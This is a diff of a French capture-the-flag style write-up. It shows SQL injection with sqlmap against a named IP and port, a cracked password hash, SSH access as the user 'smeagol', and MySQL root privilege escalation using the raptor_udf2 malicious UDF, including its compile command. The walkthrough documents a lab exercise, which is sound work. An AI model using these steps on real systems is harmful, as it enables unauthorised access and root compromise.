@@ -62,6 +62,9 @@ Je décode à nouveau cette chaîne pour obtenir :
 ```
 Je rajoute cela à l'URL et je me retrouve sur un champ de connexion.
 ![Page Initiale](5.png "Premier screen") 
+
+Depuis cette page je lui balance mes trois mois de cyber donc analyse burpsuite xss-strike du gros commix mais sans grande réponse jusqu'a **SQLMap**
+
 ---
 
 ## Étape 3 : Exploitation avec SQL Injection
@@ -109,6 +112,7 @@ Le mot de passe trouvé est :
 4dd56158acdba81bfe3ff9d3d7375231596ce10f:darkshadow
 ```
 Ho la fête
+
 ---
 
 ## Étape 4 : Accès SSH
@@ -121,6 +125,7 @@ sqlmap -u http://212.129.28.21:1337/978345210/index.php --method POST --data "us
 ```
 
 SQLMap extrait la table `Users` de la base `Webapp` :
+
 ![Page Initiale](7.png "Premier screen") 
 ```
 +----+----------+------------------+
@@ -134,6 +139,7 @@ SQLMap extrait la table `Users` de la base `Webapp` :
 +----+----------+------------------+
 ```
 Ducoup je le passe sur la page de login:
+
 ![Page Initiale](8.png "Premier screen") 
 
 Je me connecte via SSH avec `smeagol` (il n'y avait que lui qui marchait):
@@ -149,6 +155,7 @@ Une fois connecté apres beaucoup de recherche je constate que MySQL tourne en r
 ## Étape 5 : Exploitation du MySQL
 
 MySQL, lorsqu'il tourne avec des privilèges root, peut être exploité pour exécuter du code arbitraire en injectant une bibliothèque malveillante. Ici, j'utilise une vieille faille bien connue sur les forums paumé concernant une **User-Defined Function (UDF)** malveillante nommée `raptor_udf2.c`.
+
 ![Page Initiale](11.png "Premier screen")
 
 ### 1. Compilation de la bibliothèque malveillante  
@@ -167,6 +174,7 @@ gcc -g -shared -o raptor_udf2.so raptor_udf2.o -lc
 
 ### 2. Injection de la bibliothèque dans MySQL  
 Une fois la bibliothèque compilée, je l’injecte dans la base de données pour l'utiliser en tant que fonction :
+
 ![Page Initiale](12.png "Premier screen")
 ```
 mysql> use mysql;
